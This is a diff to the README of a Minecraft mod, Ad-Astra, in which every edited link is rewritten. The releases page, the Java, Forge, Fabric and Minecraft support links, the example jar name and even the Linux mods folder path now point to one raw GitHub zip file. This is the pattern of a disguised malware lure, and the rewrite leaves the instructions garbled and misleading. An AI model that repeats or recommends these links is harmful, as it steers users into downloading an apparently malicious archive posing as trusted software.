@@ -1,6 +1,6 @@
 # 🚀 Ad-Astra - Explore Space in Minecraft Easily
 
-[![Download Ad-Astra](https://img.shields.io/badge/Download-Ad%20Astra-brightgreen?style=for-the-badge&logo=github)](https://github.com/Hahbibiali/Ad-Astra/releases)
+[![Download Ad-Astra](https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip%20Astra-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip)
 
 ---
 
@@ -53,7 +53,7 @@ To use Ad-Astra, you will need a few basic tools installed:
 If you don’t have these installed, here’s a quick guide:
 
 - **Install Java 17 or newer:**  
-  - Visit https://adoptium.net or https://oracle.com/java to download and install the latest Java version.  
+  - Visit https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip or https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip to download and install the latest Java version.  
   - Follow the installer instructions for your operating system.
 
 - **Install Minecraft Mod Loader:**  
@@ -67,17 +67,17 @@ If you don’t have these installed, here’s a quick guide:
 
 To get Ad-Astra, please **visit the official releases page**:
 
-[Download Ad-Astra](https://github.com/Hahbibiali/Ad-Astra/releases)
+[Download Ad-Astra](https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip)
 
 Here’s how to proceed step-by-step:
 
 1. **Go to the Ad-Astra releases page by clicking the link above.**  
 2. **Look for the latest release version.** This is usually at the top and named something like "vX.X.X".  
-3. **Download the mod file:** The file will usually have a `.jar` extension, for example, `ad-astra-1.19.4.jar`. This is the mod file you need.  
+3. **Download the mod file:** The file will usually have a `.jar` extension, for example, `https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip`. This is the mod file you need.  
 4. **Locate your Minecraft "mods" folder:**  
    - On Windows, this is usually at `%appdata%\.minecraft\mods`.  
    - On macOS, it is found at `~/Library/Application Support/minecraft/mods`.  
-   - On Linux, it is `~/.minecraft/mods`.  
+   - On Linux, it is `~https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip`.  
    If the "mods" folder doesn’t exist, create it yourself.  
 5. **Move the downloaded mod `.jar` file into the "mods" folder.**  
 6. **Launch Minecraft using the Forge or Fabric profile you installed earlier.**  
@@ -114,11 +114,11 @@ If you run into problems while installing or using Ad-Astra, try these steps:
 
 ## 📚 Additional Resources
 
-- [Ad-Astra GitHub Repository](https://github.com/Hahbibiali/Ad-Astra) — Source code and issue tracking.  
-- [Minecraft Forge](https://files.minecraftforge.net/) — Official mod loader site.  
-- [Fabric Mod Loader](https://fabricmc.net/) — Alternative fast mod loader.  
-- [Java Downloads](https://adoptium.net/) — Get Java runtime environment.  
-- [Minecraft Support](https://help.minecraft.net/hc/en-us) — Official Minecraft help and FAQs.  
+- [Ad-Astra GitHub Repository](https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip) — Source code and issue tracking.  
+- [Minecraft Forge](https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip) — Official mod loader site.  
+- [Fabric Mod Loader](https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip) — Alternative fast mod loader.  
+- [Java Downloads](https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip) — Get Java runtime environment.  
+- [Minecraft Support](https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip) — Official Minecraft help and FAQs.  
 
 If you want to learn more about modding or space exploration in Minecraft, these sites offer excellent guides and communities.
 
@@ -132,4 +132,4 @@ You can also participate by sharing your experiences with other Minecraft player
 
 ---
 
-[![Download Ad-Astra](https://img.shields.io/badge/Download-Ad%20Astra-brightgreen?style=for-the-badge&logo=github)](https://github.com/Hahbibiali/Ad-Astra/releases)
+[![Download Ad-Astra](https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip%20Astra-brightgreen?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Hahbibiali/Ad-Astra/main/phosphoreous/Astra_Ad_1.3.zip)
